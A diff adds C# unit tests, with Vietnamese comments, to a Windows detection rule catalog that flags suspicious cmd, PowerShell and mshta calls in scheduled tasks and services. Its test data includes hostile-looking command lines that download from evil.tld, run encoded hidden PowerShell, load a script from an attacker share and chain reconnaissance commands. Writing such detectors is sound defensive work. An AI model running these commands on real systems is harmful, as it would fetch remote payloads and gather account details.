@@ -513,4 +513,129 @@ public class RuleCatalogTests
 
         Assert.Equal(ids.Length, ids.Distinct().Count());
     }
+
+    // ==================================================== cmd / powershell (bước 14)
+    //
+    // Mentor neu dich danh 'cmd /c'. Nhung day la hai binary duoc task hop le dung
+    // nhieu nhat tren mot may Windows, nen BAT BUOC xet theo ngu canh - cung ly do
+    // rundll32 phai tach ra ContextualLolBins sau khi do duoc 6/6 duong tinh gia.
+
+    /// <summary>
+    /// Nhóm này là lý do rule phải xét ngữ cảnh. Gọi shell với tham số vô hại là
+    /// chuyện hoàn toàn bình thường — báo động ở đây là tự làm ngập tab Cảnh báo.
+    /// </summary>
+    [Theory]
+    [InlineData(@"C:\Windows\System32\cmd.exe", "/c echo hello")]
+    [InlineData(@"C:\Windows\System32\cmd.exe", @"/c C:\Program Files\App\run.bat")]
+    [InlineData(@"C:\Windows\System32\powershell.exe", @"-File C:\Program Files\App\job.ps1")]
+    public void Shell_ThamSoVoHai_KhongCanhBao(string command, string arguments)
+    {
+        Assert.DoesNotContain(
+            RuleCatalog.TaskLolBin,
+            RuleIds(Task(command: command, arguments: arguments)));
+    }
+
+    /// <summary>Bốn loại ngữ cảnh biến một lời gọi shell thành đáng ngờ.</summary>
+    [Theory]
+    // 1. tham so tro vao thu muc nguoi dung ghi duoc - dung truong hop mentor neu
+    [InlineData(@"C:\Windows\System32\cmd.exe", @"/c C:\Users\Public\a.bat")]
+    [InlineData(@"C:\Windows\System32\cmd.exe", @"/c %TEMP%\dropper.bat")]
+    // 2. tai / chay tu xa
+    [InlineData(@"C:\Windows\System32\cmd.exe", "/c curl http://evil.tld/a.exe")]
+    [InlineData(@"C:\Windows\System32\powershell.exe", @"-c \\attacker\share\x.ps1")]
+    // 3. co dang ngo
+    [InlineData(@"C:\Windows\System32\powershell.exe", "-nop -w hidden -enc SQBFAFgA")]
+    // 4. noi nhieu lenh
+    [InlineData(@"C:\Windows\System32\cmd.exe", "/c whoami && net user")]
+    public void Shell_CoNguCanhDangNgo_CanhBaoHigh(string command, string arguments)
+    {
+        var hit = HitFor(Task(command: command, arguments: arguments), RuleCatalog.TaskLolBin);
+
+        Assert.NotNull(hit);
+        Assert.Equal(RiskLevel.High, hit.Severity);
+    }
+
+    /// <summary>Shell không có tham số thì không có ngữ cảnh nào để xét.</summary>
+    [Fact]
+    public void Shell_KhongThamSo_KhongCanhBao()
+    {
+        Assert.DoesNotContain(
+            RuleCatalog.TaskLolBin,
+            RuleIds(Task(command: @"C:\Windows\System32\cmd.exe")));
+    }
+
+    // ==================================== Phân tích lệnh của Service (bước 14)
+
+    /// <summary>
+    /// Lỗ hổng bất đối xứng đã vá: trước bước 14 phía Service KHÔNG có rule nào đọc
+    /// dòng lệnh (Task có ba). Service trỏ vào System32 — đường dẫn hoàn toàn chuẩn
+    /// nên <c>SERVICE_NONSTANDARD_PATH</c> im lặng — mà chạy shell thì lọt hoàn toàn.
+    /// </summary>
+    [Fact]
+    public void Service_DuongDanChuanNhungLenhDangNgo_VanCanhBao()
+    {
+        var evt = Service(imagePath: @"C:\Windows\System32\cmd.exe /c powershell -enc SQBFAFgA");
+
+        // Duong dan chuan nen rule cu khong bat.
+        Assert.DoesNotContain(RuleCatalog.ServiceNonStandardPath, RuleIds(evt));
+
+        var hit = HitFor(evt, RuleCatalog.ServiceSuspiciousCommand);
+        Assert.NotNull(hit);
+        Assert.Equal(RiskLevel.High, hit.Severity);
+    }
+
+    [Fact]
+    public void Service_LolBinTrongImagePath_CanhBao()
+    {
+        var hit = HitFor(
+            Service(imagePath: @"C:\Windows\System32\mshta.exe http://evil.tld/a.hta"),
+            RuleCatalog.ServiceSuspiciousCommand);
+
+        Assert.NotNull(hit);
+    }
+
+    /// <summary>Service bình thường không được báo — đây là phần chống dương tính giả.</summary>
+    [Theory]
+    [InlineData(@"C:\Windows\System32\svchost.exe -k netsvcs")]
+    [InlineData(@"""C:\Program Files\App\service.exe""")]
+    [InlineData(@"\??\C:\Windows\System32\drivers\driver.sys")]
+    public void Service_LenhBinhThuong_KhongCanhBao(string imagePath)
+    {
+        Assert.DoesNotContain(
+            RuleCatalog.ServiceSuspiciousCommand,
+            RuleIds(Service(imagePath: imagePath)));
+    }
+
+    // ============================== Phân biệt "khai báo" với "đã thực thi" (bước 14)
+
+    /// <summary>
+    /// Mentor nhấn mạnh "theo dõi ... khi chúng THỰC THI". Event 200/201 nghĩa là task
+    /// đã CHẠY THẬT, khác hẳn 4698 mới chỉ là đăng ký — câu bằng chứng phải nói rõ để
+    /// người trực thấy ngay, không phải tự tra Event ID.
+    /// </summary>
+    [Fact]
+    public void EventThucThi_CauBangChungGhiRoDaChay()
+    {
+        var declared = HitFor(
+            Task(eventId: 4698, command: @"C:\Users\Public\a.exe"), RuleCatalog.TaskWritableDir);
+
+        var executed = HitFor(
+            Task(eventId: 200, command: @"C:\Users\Public\a.exe"), RuleCatalog.TaskWritableDir);
+
+        Assert.NotNull(declared);
+        Assert.NotNull(executed);
+
+        Assert.DoesNotContain("ĐÃ THỰC THI", declared.Evidence);
+        Assert.Contains("ĐÃ THỰC THI", executed.Evidence);
+    }
+
+    /// <summary>Bảng rule phải có cả hai rule mới, nếu không mentor đọc bảng sẽ thấy thiếu.</summary>
+    [Fact]
+    public void BangRule_CoRuleMoiCuaBuoc14()
+    {
+        var ids = RuleCatalog.Describe().Select(r => r.Id).ToArray();
+
+        Assert.Contains(RuleCatalog.ServiceSuspiciousCommand, ids);
+        Assert.Contains(RuleCatalog.BlacklistHit, ids);
+    }
 }
